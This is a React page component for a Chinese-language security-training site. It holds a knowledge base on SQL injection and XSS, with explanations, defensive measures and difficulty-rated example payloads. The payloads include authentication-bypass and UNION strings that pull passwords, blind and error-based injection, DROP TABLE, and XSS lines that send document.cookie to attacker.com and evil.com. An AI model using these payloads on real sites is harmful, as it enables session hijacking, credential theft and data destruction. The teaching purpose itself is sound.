import React, { useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faArrowLeft, 
  faBook, 
  faCode,
  faPlayCircle,
  faCheckCircle,
  faExclamationTriangle,
  faInfoCircle,
  faClock
} from '@fortawesome/free-solid-svg-icons';

// 知识库数据 - 实际应用中可从API获取
const knowledgeData = {
  'sql-injection': {
    title: 'SQL注入漏洞',
    icon: faCode,
    description: 'SQL注入是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意SQL代码，来操纵数据库执行非预期的命令。',
    sections: [
      {
        title: '字符型SQL注入',
        content: '字符型SQL注入是指在字符串参数中进行注入，通常需要闭合引号。例如在 username=\'admin\' 的查询中，可以输入 admin\' OR \'1\'=\'1 来绕过登录验证。',
        examples: [
          "admin' OR '1'='1", 
          "admin' --",
          "admin' OR 1=1 #"
        ],
        difficulty: 'beginner'
      },
      {
        title: '数值型SQL注入',
        content: '数值型SQL注入是在数字参数中进行的注入，不需要引号闭合。例如在 id=1 的查询中，可以输入 1 OR 1=1 来返回所有记录。',
        examples: [
          "1 OR 1=1", 
          "1 AND 1=0 UNION SELECT 1,2,3,4",
          "1; SELECT * FROM users"
        ],
        difficulty: 'beginner'
      },
      {
        title: '联合注入',
        content: 'UNION注入利用SQL的UNION运算符合并两个SELECT语句的结果，用于从其他表获取数据。需要知道表的列数并确保类型匹配。',
        examples: [
          "1' UNION SELECT 1,2,3,4,5 --", 
          "1' UNION SELECT null,null,username,password,null FROM users --"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '报错注入',
        content: '报错注入利用数据库的错误消息来提取信息。通过构造能触发错误但同时在错误消息中包含查询结果的SQL语句。',
        examples: [
          "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
          "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '布尔盲注',
        content: '布尔盲注在无法直接获取查询结果时使用，通过观察应用的真/假响应来推断信息。每次只能提取一位信息。',
        examples: [
          "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90 --",
          "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a' --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '时间盲注',
        content: '时间盲注是另一种盲注技术，使用数据库的时间延迟函数。如果条件为真，查询会延迟执行，攻击者通过响应时间来推断结果。',
        examples: [
          "1' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90, SLEEP(5), 0) --",
          "1'; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '二阶注入',
        content: '二阶注入是一种高级技术，攻击者首先将恶意输入存储在数据库中，然后在应用程序的另一个部分触发该输入被使用，造成注入。',
        examples: [
          "注册用户名: admin'-- 后登录并修改密码",
          "在个人资料中存储 '); DROP TABLE users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '绕过技术',
        content: '绕过技术用于规避应用程序的安全过滤。包括使用编码、注释、等效函数替换和空格替代等方法。',
        examples: [
          "空格替代: 1'/**/OR/**/1=1--",
          "大小写混合: UnIoN SeLeCt 1,2,3",
          "编码绕过: admin%27 OR 1=1",
          "注释嵌套: /*!50000 UNION*/ SELECT 1,2,3"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '使用参数化查询和预编译语句',
      '实施输入验证和过滤',
      '限制数据库用户权限',
      '使用WAF和入侵检测系统',
      '定期进行安全审计和渗透测试'
    ]
  },
  'xss': {
    title: '跨站脚本漏洞',
    icon: faCode,
    description: '跨站脚本(XSS)是一种注入攻击，攻击者在网页中注入恶意客户端代码。当用户浏览受影响的页面时，恶意脚本会执行，可能窃取信息或执行未授权操作。',
    sections: [
      {
        title: '反射型跨站脚本',
        content: '反射型XSS是最常见的类型，恶意代码从请求中"反射"到响应中。通常通过URL参数、表单提交或其他HTTP请求方式触发。',
        examples: [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert('XSS')>",
          "<svg onload=alert('XSS')>"
        ],
        difficulty: 'beginner'
      },
      {
        title: '存储型跨站脚本',
        content: '存储型XSS是最危险的类型，恶意代码被永久存储在目标服务器上（如数据库）。当用户请求存储数据的页面时，恶意代码被执行。',
        examples: [
          "在评论框中: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
          "在个人资料中: <img src=x onerror=fetch('https://evil.com?cookie='+btoa(document.cookie))>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'DOM型跨站脚本',
        content: 'DOM型XSS不涉及服务器，而是攻击发生在客户端，恶意代码通过修改页面DOM环境触发。通常利用JavaScript动态操作DOM的页面。',
        examples: [
          "location.hash操作: https://example.com/page#<img src=x onerror=alert(1)>",
          "eval()执行: ?input=alert(1)"
        ],
        difficulty: 'advanced'
      },
      {
        title: '利用XSS平台获取Cookie',
        content: 'XSS攻击常用于窃取用户Cookie，攻击者可以利用这些Cookie劫持用户会话。专业的XSS平台可以自动化这一过程。',
        examples: [
          "<script>new Image().src='https://attacker.com/steal.php?cookie='+encodeURIComponent(document.cookie);</script>",
          "<script>fetch('https://evil.com/collect?data='+btoa(document.cookie))</script>"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '对输出进行HTML转义',
      '使用内容安全策略(CSP)',
      '实施输入验证',
      '使用HttpOnly和Secure标志保护Cookie',
      '使用现代框架的内置XSS保护'
    ]
  }
  // 其他知识分类可以按需添加
};

function KnowledgeDetail() {
  const { categoryId } = useParams();
  const [category, setCategory] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setLoading(true);
    
    // 模拟API请求
    setTimeout(() => {
      if (knowledgeData[categoryId]) {
        setCategory(knowledgeData[categoryId]);
      }
      setLoading(false);
    }, 300);
  }, [categoryId]);

  // 如果正在加载
  if (loading) {
    return (
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="bg-[#222222] rounded-lg p-6">
          <div className="flex items-center justify-center py-10">
            <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-primary"></div>
          </div>
        </div>
      </main>
    );
  }

  // 如果未找到分类
  if (!category) {
    return (
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="bg-[#222222] rounded-lg p-6">
          <Link to="/knowledge" className="text-primary hover:text-primary/90 mb-6 inline-flex items-center">
            <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
            返回知识库
          </Link>
          <div className="text-center py-12">
            <FontAwesomeIcon icon={faExclamationTriangle} className="text-yellow-500 text-5xl mb-4" />
            <h1 className="text-2xl font-bold mb-2">未找到该知识分类</h1>
            <p className="text-gray-400">您请求的知识分类不存在或已被移除</p>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="max-w-7xl mx-auto px-4 py-8">
      <div className="bg-[#222222] rounded-lg p-6">
        <Link to="/knowledge" className="text-primary hover:text-primary/90 mb-6 inline-flex items-center">
          <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
          返回知识库
        </Link>
        
        <div className="mb-8">
          <div className="flex items-center mb-4">
            <div className="bg-primary/20 p-3 rounded-lg mr-4">
              <FontAwesomeIcon icon={category.icon} className="text-primary text-2xl" />
            </div>
            <h1 className="text-3xl font-bold">{category.title}</h1>
          </div>
          
          <p className="text-gray-300 mb-6">{category.description}</p>
          
          <div className="bg-[#2A2A2A] rounded-lg p-4 mb-8">
            <h2 className="text-xl font-semibold mb-4 flex items-center">
              <FontAwesomeIcon icon={faInfoCircle} className="text-primary mr-2" />
              防护措施
            </h2>
            <ul className="space-y-2 ml-6 list-disc text-gray-300">
              {category.protection.map((item, index) => (
                <li key={index}>{item}</li>
              ))}
            </ul>
          </div>
        </div>
        
        {/* 详细内容章节 */}
        <div className="space-y-8">
          {category.sections.map((section, index) => (
            <div key={index} className="bg-[#2A2A2A] rounded-lg p-6">
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-xl font-semibold">{section.title}</h2>
                <span className={`px-3 py-1 rounded-full text-sm ${
                  section.difficulty === 'beginner' ? 'bg-green-500/20 text-green-400' :
                  section.difficulty === 'intermediate' ? 'bg-blue-500/20 text-blue-400' :
                  section.difficulty === 'advanced' ? 'bg-yellow-500/20 text-yellow-400' :
                  'bg-red-500/20 text-red-400'
                }`}>
                  {
                    section.difficulty === 'beginner' ? '入门' :
                    section.difficulty === 'intermediate' ? '中级' :
                    section.difficulty === 'advanced' ? '高级' : '专家'
                  }
                </span>
              </div>
              
              <p className="text-gray-300 mb-6">{section.content}</p>
              
              {section.examples && section.examples.length > 0 && (
                <div>
                  <h3 className="text-lg font-medium mb-3 flex items-center">
                    <FontAwesomeIcon icon={faCode} className="text-primary mr-2" />
                    示例代码
                  </h3>
                  <div className="bg-[#1E1E1E] rounded-lg p-4 mb-4">
                    <pre className="text-gray-300 overflow-x-auto">
                      {section.examples.map((example, i) => (
                        <div key={i} className="mb-2 font-mono">
                          <span className="text-gray-500 select-none mr-2">{i+1}.</span>
                          <code className="text-primary">{example}</code>
                        </div>
                      ))}
                    </pre>
                  </div>
                </div>
              )}
              
              <div className="flex justify-between items-center mt-4">
                <span className="text-gray-500 text-sm flex items-center">
                  <FontAwesomeIcon icon={faClock} className="mr-1" />
                  预计学习时间: {section.difficulty === 'beginner' ? '30分钟' : 
                               section.difficulty === 'intermediate' ? '1小时' :
                               section.difficulty === 'advanced' ? '2小时' : '3小时+'}
                </span>
                
                <div className="flex space-x-2">
                  <button className="bg-[#333333] hover:bg-[#444444] text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200">
                    <FontAwesomeIcon icon={faBook} className="mr-1" />
                    学习
                  </button>
                  <button className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200">
                    <FontAwesomeIcon icon={faPlayCircle} className="mr-1" />
                    实验
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </main>
  );
}

export default KnowledgeDetail; 